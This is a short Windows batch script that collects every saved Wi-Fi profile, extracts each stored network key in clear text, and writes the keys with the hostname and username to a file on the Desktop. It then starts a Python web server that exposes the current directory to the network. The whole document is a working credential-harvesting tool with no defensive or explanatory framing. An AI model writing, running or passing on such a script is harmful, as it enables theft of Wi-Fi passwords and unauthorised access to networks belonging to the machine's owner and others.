@echo off
setlocal enabledelayedexpansion

set "user_home=%USERPROFILE%"
set "web_server_command=python -m http.server"

set "output_folder=%user_home%\Desktop\info"
if not exist "%output_folder%" mkdir "%output_folder%"

powershell -Command "netsh wlan show profiles | ForEach-Object {($_ -split ':', 2)[1].Trim()} 2> $null" > "%temp%\profiles.txt"

(
  echo Hostname: %COMPUTERNAME%
  echo Username: %USERNAME%
  echo Current Directory: %CD%
  echo --------------------------------------------------
) > "%user_home%\Desktop\info\info.txt"

for /f "tokens=*" %%p in (%temp%\profiles.txt) do (
    set "profile_name=%%p"
    set "command=powershell -Command ""netsh wlan show profile name='!profile_name!' key=clear"""

    for /f "delims=" %%o in ('!command! ^| find "Key Content"') do (
        set "key_content=%%o"
        set "key_content=!key_content:*: =!"

        if defined key_content (
            echo Profile: !profile_name! >> "%user_home%\Desktop\info\info.txt"
            echo Key Content: !key_content! >> "%user_home%\Desktop\info\info.txt"
            echo -------------------------------------------------- >> "%user_home%\Desktop\info\info.txt"
        )
    )
)

%web_server_command%

exit /b 0
